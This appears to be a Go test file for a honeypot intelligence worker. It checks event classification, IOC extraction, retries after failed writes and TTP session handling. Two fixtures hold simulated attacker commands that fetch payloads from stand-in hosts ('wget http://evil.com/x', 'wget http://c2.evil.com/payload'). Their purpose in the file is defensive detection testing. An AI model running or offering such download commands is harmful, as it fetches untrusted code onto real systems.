package intelligence

import (
	"context"
	"errors"
	"io"
	"sync/atomic"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// fakeDB is a minimal database.Database stub for worker tests.
type fakeDB struct {
	events       []*database.Event
	taggedCount  atomic.Int64
	iocCount     atomic.Int64
	ttpCount     atomic.Int64
	failTagEvent bool
}

func (f *fakeDB) Connect(ctx context.Context) error                             { return nil }
func (f *fakeDB) Close() error                                                  { return nil }
func (f *fakeDB) Ping(ctx context.Context) error                                { return nil }
func (f *fakeDB) InitializeSchema(ctx context.Context) error                    { return nil }
func (f *fakeDB) GetSchemaVersion(ctx context.Context) (int, error)             { return 1, nil }
func (f *fakeDB) SetSchemaVersion(ctx context.Context, v int) error             { return nil }
func (f *fakeDB) InsertEvent(ctx context.Context, e *database.Event) error      { return nil }
func (f *fakeDB) InsertEvents(ctx context.Context, evs []*database.Event) error { return nil }
func (f *fakeDB) GetEvents(ctx context.Context, filter database.EventFilter) ([]*database.Event, error) {
	return nil, nil
}
func (f *fakeDB) GetEventByID(ctx context.Context, id string) (*database.Event, error) {
	return nil, nil
}
func (f *fakeDB) GetStats(ctx context.Context, since time.Time) (*database.Stats, error) {
	return &database.Stats{}, nil
}
func (f *fakeDB) GetTopAttackers(ctx context.Context, limit int, since time.Time) ([]*database.AttackerStats, error) {
	return nil, nil
}
func (f *fakeDB) GetHoneypotStats(ctx context.Context, hp string, since time.Time) (*database.HoneypotStats, error) {
	return &database.HoneypotStats{}, nil
}
func (f *fakeDB) RetentionCleanup(ctx context.Context, olderThan time.Time) error   { return nil }
func (f *fakeDB) Optimize(ctx context.Context) error                                { return nil }
func (f *fakeDB) ExportData(ctx context.Context, s, e time.Time, w io.Writer) error { return nil }
func (f *fakeDB) ImportData(ctx context.Context, r io.Reader) error                 { return nil }
func (f *fakeDB) WithPool(pool *database.Pool) database.Database                    { return f }
func (f *fakeDB) GetPoolStats() database.PoolStats                                  { return database.PoolStats{} }
func (f *fakeDB) TagEvent(ctx context.Context, e *database.Event) error {
	if f.failTagEvent {
		return nil // silently ignore in production worker
	}
	f.taggedCount.Add(1)
	return nil
}
func (f *fakeDB) InsertIOC(ctx context.Context, ioc *database.IOC) error {
	f.iocCount.Add(1)
	return nil
}
func (f *fakeDB) InsertIOCs(ctx context.Context, iocs []*database.IOC) error {
	f.iocCount.Add(int64(len(iocs)))
	return nil
}
func (f *fakeDB) GetIOCs(ctx context.Context, filter database.IOCFilter) ([]*database.IOC, error) {
	return nil, nil
}
func (f *fakeDB) UpsertTTPSession(ctx context.Context, s *database.TTPSession) error {
	f.ttpCount.Add(1)
	return nil
}
func (f *fakeDB) GetTTPSessions(ctx context.Context, limit int) ([]*database.TTPSession, error) {
	return nil, nil
}
func (f *fakeDB) GetUnclassifiedEvents(ctx context.Context, limit int) ([]*database.Event, error) {
	if len(f.events) == 0 {
		return nil, nil
	}
	if limit > len(f.events) {
		limit = len(f.events)
	}
	out := make([]*database.Event, limit)
	copy(out, f.events[:limit])
	return out, nil
}

func newTestWorker(t *testing.T, db *fakeDB) *Worker {
	t.Helper()
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	ttpBuilder := NewTTPBuilder(30 * time.Minute)
	classifier := NewClassifier(loader, ttpBuilder)
	return NewWorker(classifier, db, 10*time.Second, 100)
}

// ---- basic worker ----

func TestWorkerClassifiesEvents(t *testing.T) {
	db := &fakeDB{
		events: []*database.Event{
			{Honeypot: "cowrie", EventType: "login_failed", SourceIP: "203.0.113.1", Timestamp: time.Now().UTC()},
			{Honeypot: "cowrie", EventType: "command", Command: "wget http://evil.com/x", SourceIP: "203.0.113.2", Timestamp: time.Now().UTC()},
		},
	}
	w := newTestWorker(t, db)
	n := w.runOnce(context.Background())
	if n != 2 {
		t.Errorf("runOnce classified %d events, want 2", n)
	}
	if db.taggedCount.Load() == 0 {
		t.Error("TagEvent should have been called for classified events")
	}
}

func TestWorkerInsertsIOCs(t *testing.T) {
	db := &fakeDB{
		events: []*database.Event{
			{
				Honeypot:  "cowrie",
				EventType: "command",
				Command:   "wget http://c2.evil.com/payload",
				SourceIP:  "203.0.113.5",
				Timestamp: time.Now().UTC(),
			},
		},
	}
	w := newTestWorker(t, db)
	w.runOnce(context.Background())
	if db.iocCount.Load() == 0 {
		t.Error("InsertIOC should have been called for the wget URL")
	}
}

func TestWorkerHandlesEmptyDB(t *testing.T) {
	db := &fakeDB{}
	w := newTestWorker(t, db)
	n := w.runOnce(context.Background())
	if n != 0 {
		t.Errorf("runOnce on empty DB returned %d, want 0", n)
	}
}

func TestWorkerNilTTPBuilder(t *testing.T) {
	// Classifier with nil ttpBuilder should not panic.
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	classifier := NewClassifier(loader, nil) // nil ttpBuilder
	db := &fakeDB{
		events: []*database.Event{
			{Honeypot: "cowrie", EventType: "login_failed", SourceIP: "203.0.113.1", Timestamp: time.Now().UTC()},
		},
	}
	w := NewWorker(classifier, db, 10*time.Second, 100)
	// Should not panic.
	w.runOnce(context.Background())
}

func TestWorkerContextCancellation(t *testing.T) {
	db := &fakeDB{}
	w := newTestWorker(t, db)

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // cancel immediately

	done := make(chan struct{})
	go func() {
		w.Run(ctx)
		close(done)
	}()

	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Error("worker.Run did not stop after context cancellation")
	}
}

// ---- stress ----

func TestWorkerStressLargeBatch(t *testing.T) {
	const eventCount = 5000
	events := make([]*database.Event, eventCount)
	for i := range events {
		events[i] = &database.Event{
			Honeypot:  "cowrie",
			EventType: "login_failed",
			Username:  "root",
			SourceIP:  "203.0.113.1",
			Timestamp: time.Now().UTC(),
		}
	}
	db := &fakeDB{events: events}
	w := newTestWorker(t, db)
	n := w.runOnce(context.Background())
	if n != 100 { // batch size is 100
		t.Errorf("runOnce should process batch of 100, got %d", n)
	}
	if db.taggedCount.Load() == 0 {
		t.Error("no events tagged in stress batch")
	}
}

func TestWorkerRepeatedRuns(t *testing.T) {
	events := []*database.Event{
		{Honeypot: "cowrie", EventType: "command", Command: "id", SourceIP: "203.0.113.1", Timestamp: time.Now().UTC()},
		{Honeypot: "cowrie", EventType: "login_failed", SourceIP: "203.0.113.2", Timestamp: time.Now().UTC()},
	}
	db := &fakeDB{events: events}
	w := newTestWorker(t, db)

	for i := 0; i < 50; i++ {
		w.runOnce(context.Background())
	}
	// Each run classifies the same events (fakeDB always returns the same slice).
	if db.taggedCount.Load() < 50 {
		t.Errorf("expected at least 50 TagEvent calls over 50 runs, got %d", db.taggedCount.Load())
	}
}

// TestWorkerZeroIntervalDoesNotPanic guards against the time.NewTicker(0)
// panic that crashed the server when a loaded config left worker_interval at
// its zero value.
func TestWorkerZeroIntervalDoesNotPanic(t *testing.T) {
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	classifier := NewClassifier(loader, NewTTPBuilder(30*time.Minute))

	// interval=0, batchSize=0 — both previously dangerous.
	w := NewWorker(classifier, &fakeDB{}, 0, 0)
	if w.interval <= 0 {
		t.Fatalf("interval not clamped: got %v", w.interval)
	}
	if w.batchSize <= 0 {
		t.Fatalf("batchSize not clamped: got %d", w.batchSize)
	}

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Run panicked with clamped interval: %v", r)
			}
			close(done)
		}()
		w.Run(ctx) // must not panic on NewTicker
	}()
	cancel()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Error("Run did not return after cancel")
	}
}

// tagTrackingDB behaves like a real backend: once an event is tagged it is no
// longer returned by GetUnclassifiedEvents.
type tagTrackingDB struct {
	fakeDB
	tagged map[*database.Event]bool
}

func (d *tagTrackingDB) TagEvent(ctx context.Context, e *database.Event) error {
	d.tagged[e] = true
	return nil
}

func (d *tagTrackingDB) GetUnclassifiedEvents(ctx context.Context, limit int) ([]*database.Event, error) {
	var out []*database.Event
	for _, e := range d.events {
		if !d.tagged[e] && len(out) < limit {
			out = append(out, e)
		}
	}
	return out, nil
}

// An event that matches no rule must still be marked processed; otherwise it is
// re-fetched forever and a full batch of such events starves newer ones.
func TestWorkerTagsUnmatchedEvents(t *testing.T) {
	unmatched := &database.Event{Honeypot: "cowrie", EventType: "session_closed",
		SourceIP: "203.0.113.9", Timestamp: time.Now().UTC()}
	db := &tagTrackingDB{fakeDB: fakeDB{events: []*database.Event{unmatched}},
		tagged: map[*database.Event]bool{}}
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	w := NewWorker(NewClassifier(loader, nil), db, 10*time.Second, 100)

	if n := w.runOnce(context.Background()); n != 1 {
		t.Fatalf("first run processed %d events, want 1", n)
	}
	if unmatched.TechniqueID != "" {
		t.Fatalf("test event unexpectedly matched rule %s", unmatched.TechniqueID)
	}
	if n := w.runOnce(context.Background()); n != 0 {
		t.Fatalf("second run re-processed %d events, want 0", n)
	}
}

// iocRetryDB models a failed write before any IOC is stored. Tagged events no
// longer appear in reads, so acknowledging a failed write loses them forever.
type iocRetryDB struct {
	tagTrackingDB
	failures int
	writes   int
}

func (d *iocRetryDB) InsertIOCs(ctx context.Context, iocs []*database.IOC) error {
	d.writes++
	if d.failures > 0 {
		d.failures--
		return errors.New("IOC store temporarily unavailable")
	}
	return d.fakeDB.InsertIOCs(ctx, iocs)
}

type batchIOCRetryDB struct{ *iocRetryDB }

func (d *batchIOCRetryDB) TagEvents(ctx context.Context, events []*database.Event) error {
	for _, event := range events {
		if err := d.TagEvent(ctx, event); err != nil {
			return err
		}
	}
	return nil
}

func TestWorkerRetriesFailedIOCWrite(t *testing.T) {
	for _, batch := range []bool{false, true} {
		t.Run(map[bool]string{false: "single tags", true: "batch tags"}[batch], func(t *testing.T) {
			testWorkerIOCRetry(t, batch, 1, "id")
		})
	}
}

func testWorkerIOCRetry(t *testing.T, batch bool, failures int, command string) {
	t.Helper()
	event := &database.Event{Timestamp: time.Now().UTC(), Honeypot: "cowrie",
		EventType: "command", Command: command, SourceIP: "8.8.4.4"}
	db := &iocRetryDB{tagTrackingDB: tagTrackingDB{
		fakeDB: fakeDB{events: []*database.Event{event}}, tagged: map[*database.Event]bool{},
	}, failures: failures}
	w := newTestWorker(t, &db.fakeDB)
	w.db = db
	if batch {
		w.db = &batchIOCRetryDB{db}
	}
	for i := 0; i < failures; i++ {
		_, complete := w.runBatch(context.Background())
		if complete || len(db.tagged) != 0 {
			t.Fatalf("failed IOC write acknowledged: complete=%v tagged=%d", complete, len(db.tagged))
		}
		if sessions := w.classifier.ttpBuilder.GetActiveSessions(); len(sessions) != 0 {
			t.Fatal("failed IOC write updated campaign counts before the event could be retried")
		}
	}
	if n, complete := w.runBatch(context.Background()); n != 1 || !complete {
		t.Fatalf("recovered write processed=%d complete=%v", n, complete)
	}
	if db.iocCount.Load() == 0 || len(db.tagged) != 1 {
		t.Fatalf("recovered write failed to persist and tag: iocs=%d tagged=%d", db.iocCount.Load(), len(db.tagged))
	}
	if sessions := w.classifier.ttpBuilder.GetActiveSessions(); len(sessions) != 1 || sessions[0].EventCount != 1 {
		t.Fatalf("retries must count the event once, sessions=%v", sessions)
	}
	if n := w.runOnce(context.Background()); n != 0 {
		t.Fatalf("acknowledged event replayed: %d", n)
	}
	if db.writes != failures+1 {
		t.Fatalf("IOC writes=%d, want %d", db.writes, failures+1)
	}
}

func TestWorkerFlushesExpiredSessionsWithoutNewEvents(t *testing.T) {
	db := &fakeDB{}
	w := newTestWorker(t, db)
	event := makeTTPEvent("203.0.113.1", "id")
	event.Timestamp = time.Now().UTC().Add(-time.Hour)
	w.classifier.ttpBuilder.Update(event)
	w.runOnce(context.Background())
	if db.ttpCount.Load() != 1 {
		t.Fatalf("idle worker persisted %d expired sessions, want 1", db.ttpCount.Load())
	}
	if got := w.classifier.ttpBuilder.GetActiveSessions(); len(got) != 0 {
		t.Fatalf("idle worker retained %d expired sessions", len(got))
	}
}

type ttpRetryDB struct {
	tagTrackingDB
	attempts int
}

func (d *ttpRetryDB) UpsertTTPSession(ctx context.Context, session *database.TTPSession) error {
	d.attempts++
	if d.attempts == 1 {
		return errors.New("session store temporarily unavailable")
	}
	return d.fakeDB.UpsertTTPSession(ctx, session)
}

func TestWorkerRetriesFailedExpiredSessionWrite(t *testing.T) {
	event := makeTTPEvent("203.0.113.1", "id")
	event.Timestamp = time.Now().UTC().Add(-time.Hour)
	db := &ttpRetryDB{tagTrackingDB: tagTrackingDB{
		fakeDB: fakeDB{events: []*database.Event{event}}, tagged: map[*database.Event]bool{},
	}}
	w := newTestWorker(t, &db.fakeDB)
	w.db = db
	w.runOnce(context.Background())
	if db.attempts != 1 || db.ttpCount.Load() != 0 {
		t.Fatalf("failure setup: attempts=%d stored=%d", db.attempts, db.ttpCount.Load())
	}
	w.runOnce(context.Background())
	if db.attempts != 2 || db.ttpCount.Load() != 1 {
		t.Fatalf("expired session lost after transient error: attempts=%d stored=%d", db.attempts, db.ttpCount.Load())
	}
	w.runOnce(context.Background())
	if db.attempts != 2 {
		t.Fatalf("persisted session replayed: attempts=%d", db.attempts)
	}
}

// partialBatchTagDB models a chunked backend that commits the first chunk
// before a later chunk fails. A single error does not imply that no rows changed.
type partialBatchTagDB struct {
	tagTrackingDB
	calls int
}

func (d *partialBatchTagDB) TagEvents(ctx context.Context, events []*database.Event) error {
	d.calls++
	for i, event := range events {
		if d.calls == 1 && i == 1 {
			return errors.New("later tagging chunk failed after the first committed")
		}
		if err := d.TagEvent(ctx, event); err != nil {
			return err
		}
	}
	return nil
}

func TestWorkerRetainsCampaignEventsAfterPartialBatchTag(t *testing.T) {
	first := makeTTPEvent("203.0.113.5", "id")
	first.Timestamp = time.Now().UTC()
	second := makeTTPEvent("203.0.113.6", "id")
	second.Timestamp = first.Timestamp.Add(time.Millisecond)
	db := &partialBatchTagDB{tagTrackingDB: tagTrackingDB{
		fakeDB: fakeDB{events: []*database.Event{first, second}}, tagged: map[*database.Event]bool{},
	}}
	w := newTestWorker(t, &db.fakeDB)
	w.db = db
	if n, complete := w.runBatch(context.Background()); n != 2 || complete {
		t.Fatalf("partial failure processed=%d complete=%v", n, complete)
	}
	if len(db.tagged) != 1 {
		t.Fatalf("partial-failure fixture tagged %d events, want 1", len(db.tagged))
	}
	if sessions := w.classifier.ttpBuilder.GetActiveSessions(); len(sessions) != 1 || sessions[0].EventCount != 2 {
		t.Fatalf("partially acknowledged batch lost campaign events: %+v", sessions)
	}
	if n, complete := w.runBatch(context.Background()); n != 1 || !complete {
		t.Fatalf("remaining event retry processed=%d complete=%v", n, complete)
	}
	// Tagging is not transactional across all backends, so retrying can count
	// an event again. At least-once processing must not lose acknowledged rows.
	var accounted int64
	for _, session := range w.classifier.ttpBuilder.GetActiveSessions() {
		accounted += session.EventCount
	}
	if len(db.tagged) != 2 || accounted < 2 {
		t.Fatalf("tagged=%d accounted=%d, want both original events retained", len(db.tagged), accounted)
	}
}

type countingCanaryMatcher struct{ calls int }

func (m *countingCanaryMatcher) MatchEvent(ctx context.Context, event *database.Event) bool {
	m.calls++
	return true
}

func TestWorkerCanaryMatchingSurvivesIOCWriteFailure(t *testing.T) {
	event := makeTTPEvent("8.8.4.4", "id")
	event.Timestamp = time.Now().UTC()
	db := &iocRetryDB{tagTrackingDB: tagTrackingDB{
		fakeDB: fakeDB{events: []*database.Event{event}}, tagged: map[*database.Event]bool{},
	}, failures: 1}
	w := newTestWorker(t, &db.fakeDB)
	w.db = db
	matcher := &countingCanaryMatcher{}
	w.WithCanaryMatcher(matcher)
	w.runOnce(context.Background())
	if matcher.calls != 1 {
		t.Fatalf("IOC table outage suppressed canary matching: calls=%d", matcher.calls)
	}
}

func TestWorkerCanaryMatchingSurvivesSessionWriteFailure(t *testing.T) {
	event := makeTTPEvent("8.8.4.4", "id")
	event.Timestamp = time.Now().UTC()
	db := &ttpRetryDB{tagTrackingDB: tagTrackingDB{
		fakeDB: fakeDB{events: []*database.Event{event}}, tagged: map[*database.Event]bool{},
	}}
	w := newTestWorker(t, &db.fakeDB)
	w.db = db
	w.pendingSessions = []*database.TTPSession{{SessionID: "synthetic-pending-session"}}
	matcher := &countingCanaryMatcher{}
	w.WithCanaryMatcher(matcher)
	w.runOnce(context.Background())
	if db.attempts != 1 || matcher.calls != 1 {
		t.Fatalf("session table outage suppressed canary matching: writes=%d matcher calls=%d", db.attempts, matcher.calls)
	}
}
